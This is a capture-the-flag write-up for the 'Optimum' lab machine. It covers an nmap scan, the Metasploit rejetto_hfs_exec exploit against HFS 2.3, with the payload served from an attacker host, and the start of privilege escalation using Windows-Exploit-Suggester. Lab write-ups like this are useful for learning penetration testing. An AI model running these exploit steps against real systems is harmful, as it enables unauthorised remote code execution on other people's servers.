# Optimum

10.10.10.8

## Initial scan

```sh
nmap -A -T5 -p- 10.10.10.8
```

Results

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-10 06:05 EDT
Nmap scan report for 10.10.10.8
Host is up (0.20s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-server-header: HFS 2.3
|_http-title: HFS /
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 198.73 seconds
```

## Gobuster

Since there's only 1 port, let's try gobuster on this

```sh
gobuster dir -u 10.10.10.8 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

This takes too long. Going to let it run in the background while looking for other exploits

## Metasploit

Looking online, there's an exploit for this specific version of http file server version 2.3.

```sh
msfconsole
use exploit/windows/http/rejetto_hfs_exec
msf5 exploit(windows/http/rejetto_hfs_exec) > set rhosts 10.10.10.8
# rhosts => 10.10.10.8
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVHOST 10.10.14.14
# SRVHOST => 10.10.14.14
msf5 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 8080
# SRVPORT => 8080
msf5 exploit(windows/http/rejetto_hfs_exec) > run
```

and a meterpreter shell is spawned. This gives us our first flag for the user `OPTIMUM\kostas`

## Privilege escalation

Let's look for some windows security vulnerabilities within this windows version.

### Getting systeminfo

```sh
execute -f "cmd.exe /c systeminfo > systeminfo.txt"
download systeminfo.txt
```

### Installing windows-exploit-suggester

Install windows-exploit-suggester from here: [exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

unzip the file and add it to `/usr/local/bin`

```sh
unzip Windows-exploit-suggester
cd Windows-expolit-suggester
suco cp Windows-exploit-suggester.py /usr/local/bin
```

### Using windows-expolit-suggester

Make sure the sysinfo.txt file and the database file is placed in the same directory, then

```sh
windows-exploit-suggest.py --update
windows-exploit-suggester.py --database 2020-04-10-mssb.xls --systeminfo systeminfo.txt
```